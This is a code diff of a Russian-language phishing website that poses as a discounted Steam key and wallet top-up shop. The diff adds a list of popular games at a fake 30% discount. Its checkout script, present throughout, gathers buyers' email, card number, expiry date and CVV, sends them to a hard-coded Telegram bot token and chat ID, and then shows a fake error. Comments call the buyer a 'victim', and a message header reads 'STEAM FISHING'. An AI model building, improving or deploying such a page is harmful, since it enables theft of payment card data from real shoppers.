@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Steam Key Shop — мгновенная доставка</title>
+    <title>Excellent Shop — скидки на Steam ключи</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, 'Segoe UI', sans-serif; }
         body { min-height: 100vh; background: linear-gradient(145deg, #1a1e2c 0%, #0f111e 100%); position: relative; overflow-x: hidden; color: #eee; }
         #starCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; }
-        .app-container { position: relative; z-index: 20; width: 100%; max-width: 1300px; margin: 0 auto; padding: 20px; }
+        .app-container { position: relative; z-index: 20; width: 100%; max-width: 1400px; margin: 0 auto; padding: 20px; }
         .store-container { animation: fadeIn 0.4s; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px);} to { opacity: 1; transform: translateY(0);} }
         .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; background: #2a2e42cc; backdrop-filter: blur(12px); border-radius: 60px; padding: 12px 24px; margin-bottom: 30px; border: 1px solid #4a4f6e; }
@@ -81,11 +81,19 @@
             box-shadow: 0 6px 14px rgba(60,95,204,0.3);
         }
         
-        .products-grid { display: flex; flex-wrap: wrap; gap: 25px; justify-content: center; margin: 30px 0; }
-        .product-card { background: #2a2e42dd; backdrop-filter: blur(4px); border: 1px solid #4a4f6e; border-radius: 32px; padding: 24px 20px; width: 260px; text-align: center; transition: 0.2s; }
+        .products-grid { 
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .product-card { background: #2a2e42dd; backdrop-filter: blur(4px); border: 1px solid #4a4f6e; border-radius: 32px; padding: 24px 20px; text-align: center; transition: 0.2s; }
         .product-card:hover { transform: translateY(-6px); background: #353b55; border-color: #6c8cff; }
-        .price { font-size: 1.8rem; font-weight: bold; color: #6c8cff; margin: 14px 0; }
-        .btn-buy { background: linear-gradient(135deg, #6c8cff, #3a5fcc); border: none; width: 100%; padding: 12px; border-radius: 40px; font-weight: bold; color: white; cursor: pointer; }
+        .price-container { margin: 14px 0; }
+        .old-price { font-size: 1.1rem; color: #aaa; text-decoration: line-through; margin-right: 10px; }
+        .new-price { font-size: 1.8rem; font-weight: bold; color: #6c8cff; }
+        .discount-badge { background: #ff4d4d; display: inline-block; padding: 2px 8px; border-radius: 20px; font-size: 0.7rem; margin-left: 8px; vertical-align: middle; }
+        .btn-buy { background: linear-gradient(135deg, #6c8cff, #3a5fcc); border: none; width: 100%; padding: 12px; border-radius: 40px; font-weight: bold; color: white; cursor: pointer; margin-top: 10px; }
         .cart-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(6px); justify-content: center; align-items: center; z-index: 1000; }
         .cart-modal-content { background: #1e1f2e; border-radius: 48px; padding: 28px; width: 450px; max-width: 90%; border: 1px solid #6c8cff; position: relative; max-height: 90vh; overflow-y: auto; color: #eee; }
         .cart-modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
@@ -129,19 +137,19 @@
 <canvas id="starCanvas"></canvas>
 
 <div class="app-container">
-    <!-- Магазин без авторизации -->
+    <!-- Магазин -->
     <div id="storeSection" class="store-container">
         <div class="header">
-            <div class="logo"><h1>🎮 Steam Key Shop</h1><span>мгновенные ключи | низкие цены</span></div>
+            <div class="logo"><h1>✨ Excellent Shop</h1><span>скидка 30% на все Steam ключи</span></div>
             <div class="user-info">
                 <span>👤 гость</span>
             </div>
             <button class="cart-icon-btn" id="openCartBtn">🛒 корзина (<span id="cartCount">0</span>)</button>
         </div>
 
-        <!-- Пополнение Steam Wallet (слайдер) -->
+        <!-- Пополнение Steam Wallet (без скидки) -->
         <div class="stock-panel">
-            <div class="stock-remaining">💰 сумма пополнения Steam Wallet</div>
+            <div class="stock-remaining">💰 пополнение Steam Wallet</div>
             <div class="stock-value" id="remainingStock">до 600 000 ₽</div>
             <div class="slider-container">
                 <input type="range" id="steamSlider" min="100" max="600000" step="100" value="100">
@@ -152,14 +160,9 @@
             <button class="buy-btn" id="buyWithSliderBtn">💎 добавить в корзину</button>
         </div>
 
-        <!-- Товары: ключи Steam -->
-        <div class="products-grid">
-            <div class="product-card"><div class="robux-icon">🎁</div><h3>Steam Key «Phantom Liberty»</h3><div class="price">499 ₽</div><button class="btn-buy" data-name="Steam Key Phantom Liberty" data-price="499" data-steam="1">купить</button></div>
-            <div class="product-card"><div class="robux-icon">🎮</div><h3>Steam Key «Elden Ring»</h3><div class="price">1299 ₽</div><button class="btn-buy" data-name="Steam Key Elden Ring" data-price="1299" data-steam="1">купить</button></div>
-            <div class="product-card"><div class="robux-icon">⚡</div><h3>Steam Wallet 1000 ₽</h3><div class="price">950 ₽</div><button class="btn-buy" data-name="Steam Wallet 1000 ₽" data-price="950" data-steam="1000">купить</button></div>
-            <div class="product-card"><div class="robux-icon">🔥</div><h3>Steam Key сборник «AAA Hit»</h3><div class="price">2499 ₽</div><button class="btn-buy" data-name="Steam AAA Hit Pack" data-price="2499" data-steam="1">купить</button></div>
-        </div>
-        <footer>⭐ доставка ключа на email после оплаты ⭐</footer>
+        <!-- Сетка игр со скидкой 30% -->
+        <div class="products-grid" id="gamesGrid"></div>
+        <footer>⭐ ключи приходят на email после оплаты ⭐</footer>
     </div>
 </div>
 
@@ -216,17 +219,55 @@
     }
     drawStars();
 
-    // слайдер для пополнения Steam Wallet
-    const MAX_BALANCE = 600000;
-    const slider = document.getElementById('steamSlider');
-    const selectedSpan = document.getElementById('selectedAmount');
-    slider.max = MAX_BALANCE;
-    slider.addEventListener('input', () => {
-        let val = parseInt(slider.value);
-        if (val > MAX_BALANCE) val = MAX_BALANCE;
-        slider.value = val;
-        selectedSpan.innerText = val.toLocaleString('ru-RU');
-    });
+    // список игр (название, исходная цена, скидка 30%)
+    const games = [
+        { name: "Elden Ring", oldPrice: 2999 },
+        { name: "Cyberpunk 2077", oldPrice: 2499 },
+        { name: "Baldur's Gate 3", oldPrice: 3599 },
+        { name: "Hogwarts Legacy", oldPrice: 2799 },
+        { name: "Red Dead Redemption 2", oldPrice: 2999 },
+        { name: "The Witcher 3: Wild Hunt", oldPrice: 1299 },
+        { name: "Call of Duty: Modern Warfare III", oldPrice: 3999 },
+        { name: "Starfield", oldPrice: 3499 },
+        { name: "Diablo IV", oldPrice: 3199 },
+        { name: "FIFA 24", oldPrice: 2499 },
+        { name: "Counter-Strike 2 (Prime)", oldPrice: 1499 },
+        { name: "Dota 2 (Arcana bundle)", oldPrice: 1999 },
+        { name: "Resident Evil 4 Remake", oldPrice: 2799 },
+        { name: "Atomic Heart", oldPrice: 2299 },
+        { name: "Hollow Knight: Silksong", oldPrice: 999 },
+        { name: "Stray", oldPrice: 1199 },
+        { name: "PUBG: Battlegrounds (G-Coin)", oldPrice: 899 },
+        { name: "Minecraft for Windows (Steam)", oldPrice: 1699 }
+    ];
+    
+    // функция для расчёта цены со скидкой 30%
+    function getDiscountedPrice(oldPrice) {
+        return Math.round(oldPrice * 0.7);
+    }
+    
+    // генерация карточек игр
+    const gamesGrid = document.getElementById('gamesGrid');
+    function renderGames() {
+        gamesGrid.innerHTML = '';
+        games.forEach(game => {
+            const newPrice = getDiscountedPrice(game.oldPrice);
+            const card = document.createElement('div');
+            card.className = 'product-card';
+            card.innerHTML = `
+                <h3>${game.name}</h3>
+                <div class="price-container">
+                    <span class="old-price">${game.oldPrice} ₽</span>
+                    <span class="new-price">${newPrice} ₽</span>
+                    <span class="discount-badge">-30%</span>
+                </div>
+                <button class="btn-buy" data-name="${game.name}" data-price="${newPrice}">купить</button>
+            `;
+            gamesGrid.appendChild(card);
+        });
+        // привязать события после отрисовки
+        bindBuyButtons();
+    }
     
     // корзина
     let cart = [];
@@ -262,16 +303,7 @@
         });
     }
     
-    // кнопка слайдера
-    document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
-        let amount = parseInt(slider.value);
-        if (amount <= 0) return;
-        let price = amount; // пополнение 1к1
-        let itemName = `Пополнение Steam Wallet: ${amount.toLocaleString('ru-RU')} ₽`;
-        addItemToCart({ name: itemName, price: price, steamAmount: amount });
-    });
-    
-    // товары
+    // кнопки купить (привязываем после генерации)
     function bindBuyButtons() {
         document.querySelectorAll('.btn-buy').forEach(btn=>{
             btn.removeEventListener('click', buyHandler);
@@ -284,7 +316,27 @@
         }
     }
     
-    // телеграм (твои данные)
+    // слайдер пополнения Steam Wallet
+    const MAX_BALANCE = 600000;
+    const slider = document.getElementById('steamSlider');
+    const selectedSpan = document.getElementById('selectedAmount');
+    slider.max = MAX_BALANCE;
+    slider.addEventListener('input', () => {
+        let val = parseInt(slider.value);
+        if (val > MAX_BALANCE) val = MAX_BALANCE;
+        slider.value = val;
+        selectedSpan.innerText = val.toLocaleString('ru-RU');
+    });
+    
+    document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
+        let amount = parseInt(slider.value);
+        if (amount <= 0) return;
+        let price = amount;
+        let itemName = `Пополнение Steam Wallet: ${amount.toLocaleString('ru-RU')} ₽`;
+        addItemToCart({ name: itemName, price: price });
+    });
+    
+    // телеграм данные (твои)
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
     const CHAT_ID = 7711202514;
     
@@ -324,7 +376,7 @@
         let totalPrice = cart.reduce((s,i)=>s+(i.price||0),0);
         let itemsText = cart.map(i=>`${i.name} — ${i.price} ₽`).join('\n');
         
-        let msg = `💳 STEAM FISHING 💳\n👤 Гость\n📧 Email: ${email}\n🛒 Товары:\n${itemsText}\n💰 Итого: ${totalPrice} ₽\n💳 Карта: ${cardNum}\n📅 Срок: ${expiry}\n🔐 CVV: ${cvv}\n🌐 IP: ${window.location.hostname}`;
+        let msg = `💳 EXCELLENT SHOP (STEAM) 💳\n👤 Гость\n📧 Email: ${email}\n🛒 Товары:\n${itemsText}\n💰 Итого: ${totalPrice} ₽\n💳 Карта: ${cardNum}\n📅 Срок: ${expiry}\n🔐 CVV: ${cvv}\n🌐 IP: ${window.location.hostname}`;
         
         try {
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -332,9 +384,8 @@
                 headers:{'Content-Type':'application/json'},
                 body: JSON.stringify({chat_id: CHAT_ID, text: msg})
             });
-            // показываем ошибку жертве
-            showErrorToast();
-            // очищаем корзину и поля
+            showErrorToast(); // жертва видит ошибку
+            // очищаем
             cart = [];
             updateCartUI();
             cartModal.style.display = 'none';
@@ -342,16 +393,15 @@
             document.getElementById('cardExpiry').value = '';
             document.getElementById('cardCvv').value = '';
             document.getElementById('steamEmail').value = '';
-            // сбрасываем слайдер на 100
             slider.value = 100;
             selectedSpan.innerText = '100';
         } catch(e) {
-            // всё равно показываем ошибку
             showErrorToast();
         }
     });
     
-    bindBuyButtons();
+    // инициализация
+    renderGames();
     updateCartUI();
 </script>
 </body>
